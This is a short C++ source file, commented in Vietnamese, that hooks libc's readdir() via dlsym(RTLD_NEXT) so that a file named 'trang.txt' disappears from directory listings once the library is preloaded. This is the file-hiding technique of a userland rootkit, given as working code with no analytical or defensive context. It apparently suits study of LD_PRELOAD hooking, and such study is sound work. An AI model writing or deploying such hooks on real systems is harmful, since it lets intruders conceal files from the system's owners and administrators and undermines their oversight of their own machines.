#define _GNU_SOURCE
#include <dlfcn.h>
#include <dirent.h>
#include <cstring>
#include <string>
#include <iostream>

// Tên file cần ẩn
const std::string hidden_file = "trang.txt";

// Hook lại hàm readdir() từ libc
extern "C" struct dirent *readdir(DIR *dirp) {
    // Lấy địa chỉ hàm gốc readdir từ libc
    using readdir_t = struct dirent *(*)(DIR *);
    static readdir_t original_readdir = reinterpret_cast<readdir_t>(dlsym(RTLD_NEXT, "readdir"));
    
    if (!original_readdir) {
        std::cerr << "Error: Unable to load original readdir function!" << std::endl;
        return nullptr;
    }

    struct dirent *entry;

    // Gọi hàm gốc readdir
    while ((entry = original_readdir(dirp)) != nullptr) {
        // Nếu tên file trùng với tên file cần ẩn, bỏ qua
        if (hidden_file == entry->d_name) {
            continue;
        }
        return entry; // Trả về entry hợp lệ
    }
    return nullptr; // Không còn entry nào
}
